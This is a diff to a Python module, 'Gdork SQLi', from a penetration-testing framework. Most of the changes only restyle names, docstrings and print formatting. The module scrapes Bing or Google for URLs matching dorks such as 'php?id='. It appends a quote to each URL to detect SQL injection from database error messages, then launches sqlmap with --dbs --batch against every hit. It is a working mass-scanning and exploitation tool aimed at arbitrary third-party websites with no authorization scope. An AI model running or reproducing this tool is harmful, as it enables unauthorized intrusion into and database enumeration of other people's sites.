@@ -2,6 +2,14 @@
 #
 # MIT - (c) 2016 ThomasTJ (TTJ)
 # Module for WMDframe
+#
+# The modules is searching either Bing or Google
+# for URL's which could be prone to SQL injections.
+# When a list of URL's are gathered, an "'" is appended
+# and the response is evaluated against common SQLi
+# error messages.
+# Todo: Check agains file instead of inline in code
+#
 
 
 import sys                          # Quit the shiat
@@ -28,31 +36,44 @@ except:
     from core.colors import bc as bc
 
 
-# START Log files, global variables, etc.
+# ==========================
+# Core START
+# ==========================
 config = core.config()
-global sqlmap
 SQLMAP_SYM = (config['TOOLS']['SQLMAP_SYM'])
+# ==========================
+# Core END
+# ==========================
 
-# Variables which needs to be defined
-filenameRawUrl = '0'
-filenameVulnUrl = '0'
-# END Log files, global variables, etc.
+
+# ==========================
+# Log files, global variables, etc. START
+# ==========================
+filename_rawurl = '0'
+filename_vulnurl = '0'
+# ==========================
+# Log files, global variables, etc. end
+# ==========================
+
 
 # OPTIONS
-class options():
+class Options():
+    """Main class for module."""
+
     Author = 'Thomas TJ (TTJ)'
     Name = 'Gdork SQLi'
     Call = 'gdsqli'
     Modulename = 'gdorksqli'
-    Version = '0.1'
+    Version = '0.2'
     Description = 'Scrape net for urls and check if they are prone to SQL injection'
     Category = 'sql'
-    Type = 'sin'
+    Type = 'sqli'
     Datecreation = '2017/01/01'
-    Lastmodified = '2017/01/01'
+    Lastmodified = '2017/02/01'
     License = 'MIT'
 
     def __init__(self, basesearch, searchprovider, maxperpage, maxpages, startpage, timeout, savesearch, filename, verboseactive):
+        """Define variables and show options on run."""
         self.basesearch = basesearch
         self.searchprovider = searchprovider
         self.maxperpage = maxperpage
@@ -66,45 +87,50 @@ class options():
 
     # Possible options
     def poss_opt(self):
+        """Possible options. These variables are checked when the user tries to 'set' an option."""
         return ('basesearch', 'searchprovider', 'maxperpage', 'maxpages', 'startpage', 'timeout', 'savesearch', 'filename', 'verboseactive')
 
     def show_opt(self):
+        """Show the possible options."""
         print(
-            ''
-            + '\n\t' + bc.OKBLUE + ('%-*s %-*s %-*s %s' % (12, 'OPTION', 8, 'RQ', 14, 'VALUE', 'DESCRIPTION')) + bc.ENDC
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, '------', 8, '--', 14, '-----', '-----------'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'base:', 8, 'y', 14, self.basesearch, 'Basesearch could be: php?id=, php?cat=, e.g.'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'searcher:', 8, 'y', 14, self.searchprovider, 'Bing or Google (b/g)'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'maxperpage:', 8, 'y', 14, self.maxperpage, 'Results per page'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'maxpages:', 8, 'y', 14, self.maxpages, 'Max pages to search'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'startpage:', 8, 'y', 14, self.startpage, 'Start page'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'timeout:', 8, 'y', 14, self.timeout, 'Timeout between request'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'savesearch:', 8, 'y', 14, self.savesearch, 'Save search results to file'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'filename:', 8, 'n', 14, self.filename, 'Filename base for search results'))
-            + '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'verbose:', 8, 'n', 14, self.verboseactive, 'Verbose level (0, 1, 2)'))
-            + '\n'
-            )
+            '' +
+            '\n\t' + bc.OKBLUE + ('%-*s %-*s %-*s %s' % (12, 'OPTION', 8, 'RQ', 14, 'VALUE', 'DESCRIPTION')) + bc.ENDC +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (12, '------', 8, '--', 14, '-----', '-----------')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'base:', 8, 'y', 14, self.basesearch, 'Basesearch could be: php?id=, php?cat=, e.g.')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'searcher:', 8, 'y', 14, self.searchprovider, 'Bing or Google (b/g)')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'maxperpage:', 8, 'y', 14, self.maxperpage, 'Results per page')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'maxpages:', 8, 'y', 14, self.maxpages, 'Max pages to search')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'startpage:', 8, 'y', 14, self.startpage, 'Start page')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'timeout:', 8, 'y', 14, self.timeout, 'Timeout between request')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'savesearch:', 8, 'y', 14, self.savesearch, 'Save search results to file')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'filename:', 8, 'n', 14, self.filename, 'Filename base for search results')) +
+            '\n\t' + ('%-*s %-*s %-*s %s' % (12, 'verbose:', 8, 'n', 14, self.verboseactive, 'Verbose level (0, 1, 2)')) +
+            '\n'
+        )
 
     # Show commands
     def show_commands(self):
+        """Show the possible commands."""
         print(
-            ''
-            + '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC
-            + '\n\t' + '---------'
-            + '\n\t' + ('%-*s ->\t%s' % (9, 'run', 'Run the script'))
-            # + '\n\t' + ('%-*s ->\t%s' % (9, 'runcom', 'Run program with specific arguments'))
-            + '\n\t' + ('%-*s ->\t%s' % (9, 'info', 'Information'))
-            + '\n\t' + ('%-*s ->\t%s' % (9, 'help', 'Help'))
-            # + '\n\t' + ('%-*s ->\t%s' % (9, 'pd', 'Predefined arguments for 'runcom''))
-            + '\n\t' + ('%-*s ->\t%s' % (9, 'so', 'Show options'))
-            + '\n\t' + ('%-*s ->\t%s' % (9, 'sa', 'Show module info'))
-            + '\n\t' + ('%-*s ->\t%s' % (9, 'invoke', 'Invoke module'))
-            + '\n\t' + ('%-*s ->\t%s' % (9, 'exit', 'Exit'))
-            + '\n'
-            )
+            '' +
+            '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC +
+            '\n\t' + '---------' +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'run', 'Run the script')) +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'info', 'Information')) +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'help', 'Help')) +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'so', 'Show options')) +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'sa', 'Show module info')) +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'invoke', 'Invoke module')) +
+            '\n\t' + ('%-*s ->\t%s' % (9, 'exit', 'Exit')) +
+            '\n'
+        )
 
     # Show all info
     def show_all(self):
+        """Show all options.
+
+        Sending main options to the core module modules.py for parsing.
+        """
         cmodules.showModuleData(
             options.Author,
             options.Name,
@@ -116,13 +142,14 @@ class options():
             options.License,
             options.Datecreation,
             options.Lastmodified
-            )
+        )
         self.show_commands()
         self.show_opt()
 # END OPTIONS
 
 
 def LoadUserAgents(uafile='files/user_agents.txt'):
+    """Get random user agents."""
     # uafile : string, path to text file of user agents, one per line
     uas = []
     with open(uafile, 'rb') as uaf:
@@ -134,6 +161,7 @@ def LoadUserAgents(uafile='files/user_agents.txt'):
 
 
 def run():
+    """The main run function."""
     basesearch = sop.basesearch
     searchprovider = sop.searchprovider
     maxperpage = sop.maxperpage
@@ -176,6 +204,7 @@ def run():
 
 
 def searchUrlForString(searchprovider, count, startpage, pages, sleeptime, string, stringurl, savesearch, filename, filename_tmp, verboseactive):
+    """Search for the string in urls with searchprovider."""
     # =================================
     # Loop through pages
     # =================================
@@ -185,9 +214,9 @@ def searchUrlForString(searchprovider, count, startpage, pages, sleeptime, strin
         # Bing search
         # =========================
         if searchprovider == 'b':
-            pagenr = int(start)*int(count)+1
+            pagenr = int(start) * int(count) + 1
             address = 'http://www.bing.com/search?q=instreamset:(url title):' + stringurl + '&count=' + count + '&first=' + str(pagenr)
-            print('\t[*]  Page number: ' + str(int(start)+1))
+            print('\t[*]  Page number: ' + str(int(start) + 1))
             # Loading random useragent
             uas = LoadUserAgents()
             ua = random.choice(uas)  # select a random user agent
@@ -198,11 +227,11 @@ def searchUrlForString(searchprovider, count, startpage, pages, sleeptime, strin
                 for a in d.find_all('a', href=True):
                     if string in a['href']:
                         print(
-                            bc.OKGREEN
-                            + '\t['
-                            + time.strftime('%H:%M:%S')
-                            + ']  [+]  ' + a['href'] + bc.ENDC
-                            )
+                            bc.OKGREEN +
+                            '\t[' +
+                            time.strftime('%H:%M:%S') +
+                            ']  [+]  ' + a['href'] + bc.ENDC
+                        )
                         if filename_tmp:
                             with open(filename_tmp, 'a') as file:
                                 file.write(a['href'] + '\n')
@@ -216,10 +245,10 @@ def searchUrlForString(searchprovider, count, startpage, pages, sleeptime, strin
         # Google search
         # =========================
         elif searchprovider == 'g':
-            pagenr = int(start)*int(count)
+            pagenr = int(start) * int(count)
             address = 'https://www.google.dk/search?q=' + stringurl + '&num=' + count + '&start=' + str(pagenr)
             # address = 'https://www.google.dk/search?q=inurl%3A' + stringurl + '&num=' + count + '&start=' + str(pagenr)
-            print('\t[*]  Page number: ' + str(int(start)+1))
+            print('\t[*]  Page number: ' + str(int(start) + 1))
             # Loading random useragent
             uas = LoadUserAgents()
             ua = random.choice(uas)  # select a random user agent
@@ -230,11 +259,11 @@ def searchUrlForString(searchprovider, count, startpage, pages, sleeptime, strin
                 url = d.text
                 if string in url:
                     print(
-                        bc.OKGREEN
-                        + ' \t['
-                        + time.strftime('%H:%M:%S')
-                        + ']  [+]  ' + url + bc.ENDC
-                        )
+                        bc.OKGREEN +
+                        ' \t[' +
+                        time.strftime('%H:%M:%S') +
+                        ']  [+]  ' + url + bc.ENDC
+                    )
                     if filename_tmp == 'y':
                         with open(filename_tmp, 'a') as file:
                             file.write(url + '\n')
@@ -272,18 +301,18 @@ def searchUrlForString(searchprovider, count, startpage, pages, sleeptime, strin
         print(bc.FAIL + '\t[-] No urls collected, exiting!')
         return None
 
-    checkUrlsForVuln(filename, filename_tmp, savesearch, verboseactive)
+    check_urls_for_vuln(filename, filename_tmp, savesearch, verboseactive)
 
 
-def checkUrlsForVuln(filename, filenameRawUrl, savesearch, verboseactive):
-
+def check_urls_for_vuln(filename, filename_rawurl, savesearch, verboseactive):
+    """Check if URLs are vuln to SQLi."""
     print('\n\n\n' + bc.HEADER)
     print('\t[*] Checking URLs for vuln')
     print('\n' + bc.ENDC)
 
     # Base input
-    if filenameRawUrl != '0':
-        urlfile = filenameRawUrl
+    if filename_rawurl != '0':
+        urlfile = filename_rawurl
 
     if not os.path.isfile(urlfile):
         print(bc.FAIL + '\t[*] URL file does not exist or no vuln urls.')
@@ -330,10 +359,10 @@ def checkUrlsForVuln(filename, filenameRawUrl, savesearch, verboseactive):
                 # Get data
                 url = line + "'"
                 print(
-                    '\t['
-                    + time.strftime('%H:%M:%S')
-                    + ']  [*]  ' + line.strip('\n')
-                    )
+                    '\t[' +
+                    time.strftime('%H:%M:%S') +
+                    ']  [*]  ' + line.strip('\n')
+                )
                 # Loading random useragent
                 uas = LoadUserAgents()
                 ua = random.choice(uas)  # select a random user agent
@@ -407,26 +436,26 @@ def checkUrlsForVuln(filename, filenameRawUrl, savesearch, verboseactive):
                 # If X is vuln
                 if (checkMY1 > 0 or checkMY2 > 0 or checkMY3 > 0 or checkMY4 > 0 or checkMS1 > 0 or checkMS2 > 0 or checkMS3 > 0 or checkOR1 > 0 or checkOR2 > 0 or checkOR3 > 0 or checkPO1 > 0 or checkPO2):
                     print(
-                        bc.OKGREEN
-                        + '\n'
-                        + '                   Possible vuln url!'
-                        + '\n'
-                        + '\t['
-                        + time.strftime('%H:%M:%S')
-                        + ']  [+]  '
-                        + line + bc.ENDC
-                        + '\n'
-                        )
+                        bc.OKGREEN +
+                        '\n' +
+                        '                   Possible vuln url!' +
+                        '\n' +
+                        '\t[' +
+                        time.strftime('%H:%M:%S') +
+                        ']  [+]  ' +
+                        line + bc.ENDC +
+                        '\n'
+                    )
                     if savesearch == 'y':
                         with open(filename, 'a') as file:
                             file.write(line)
                 else:
                     print(
-                        bc.WARNING
-                        + '\t['
-                        + time.strftime('%H:%M:%S')
-                        + ']  [-]  ' + line + bc.ENDC
-                        )
+                        bc.WARNING +
+                        '\t[' +
+                        time.strftime('%H:%M:%S') +
+                        ']  [-]  ' + line + bc.ENDC
+                    )
 
             # Skip X or/and exit
             except KeyboardInterrupt:
@@ -458,13 +487,14 @@ def checkUrlsForVuln(filename, filenameRawUrl, savesearch, verboseactive):
     print('\t[!]  Run vuln urls through SQLmap (y/n)?')
     checkurls = input('\t->  ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'runSQLmap:' + bc.ENDC + ' ')
     if checkurls == 'y':
-        scanUrlsSQLmap(filename)
+        scan_urls_sqlmap(filename)
     else:
         print(bc.ENDC + '\t[!] Exiting\n\n')
         return None
 
 
-def scanUrlsSQLmap(filenameVulnUrl):
+def scan_urls_sqlmap(filename_vulnurl):
+    """Scan URLs with SQLmap."""
     print('\n\n\n' + bc.HEADER)
     print('\t[*] Starting SQLmap')
     print('\n' + bc.ENDC)
@@ -474,18 +504,18 @@ def scanUrlsSQLmap(filenameVulnUrl):
     # =================================
 
     if shutil.which('sqlmap') is None:
-        print('\t[!] SQLmap is not installed on system - can't go on.')
+        print('\t[!] SQLmap is not installed on system - can\'t go on.')
         print('\t[!] Install sqlmap and run command below (sudo pacman -S sqlmap, sudo apt-get install sqlmap, etc.)')
         print('\n\t[!] Command:')
-        print('\t[*] ' + sqlmap + ' -m \'' + filenameVulnUrl + '\n')
+        print('\t[*] ' + sqlmap + ' -m \'' + filename_vulnurl + '\n')
     else:
-        if filenameVulnUrl == '0':
+        if filename_vulnurl == '0':
             print('\t[!] No filename in memory, please specify.')
             return None
 
     print(bc.ENDC + '\t[*] SQLmap will be started with arguments dbs, batch, random-agent, 4xthreads.')
 
-    fileDestination = (os.getcwd() + '/' + filenameVulnUrl)
+    fileDestination = (os.getcwd() + '/' + filename_vulnurl)
     command = (sqlmap + ' -m ' + fileDestination + ' --dbs --batch --random-agent --threads 4')
     print('\t[*] Command to execute: ' + command)
     print(bc.BOLD + '\t[*] Press Ctrl + c to exit\n\n\n')
@@ -503,7 +533,8 @@ def scanUrlsSQLmap(filenameVulnUrl):
 
 
 def justCheckUrls():
-    print('  Filepath from run is still in memory: ' + filenameRawUrl)
+    """Check URLs."""
+    print('  Filepath from run is still in memory: ' + filename_rawurl)
     urlfileChoose = input(bc.ENDC + '  (i)nput new filename, or (u)se from memory (i/U): ' + bc.OKBLUE)
     if urlfileChoose not in ('i', 'u'):
         print(bc.WARNING + '  - Using from memory')
@@ -513,6 +544,7 @@ def justCheckUrls():
 
 
 def info():
+    """Info."""
     print("\n\n" + bc.HEADER)
     print("  .---.  .---.     .-''-.    .---.     .-------.         ,---.    ,---.    .-''-.   ")
     print("  |   |  |_ _|   .'_ _   \   | ,_|     \  _(`)_ \        |    \  /    |  .'_ _   \  ")
@@ -558,6 +590,7 @@ def info():
 
 # CONSOLE
 def console():
+    """Main console."""
     valueQ = input('  ' + bc.FAIL + 'mdw' + bc.ENDC + '@' + bc.FAIL + 'gdsqli:' + bc.ENDC + ' ')
     userinput = valueQ.split()
     if 'so' in userinput[:1]:
@@ -595,6 +628,7 @@ def console():
 
 
 def main():
+    """The main function."""
     print('\n\n')
     print('      _____           __   _____ ____    __       _         _           __  _           ')
     print('     / __(_)___  ____/ /  / ___// __ \  / /      (_)___    (_)__  _____/ /_(_)___  ____ ')
@@ -610,5 +644,5 @@ def main():
     comm.checkNetConnectionV()
     print('')
     global sop
-    sop = options('php?id=', 'b', '25', '10', '1', '5', 'y', 'gdorksqli', '0')
+    sop = Options('php?id=', 'b', '25', '10', '1', '5', 'y', 'gdorksqli', '0')
     console()
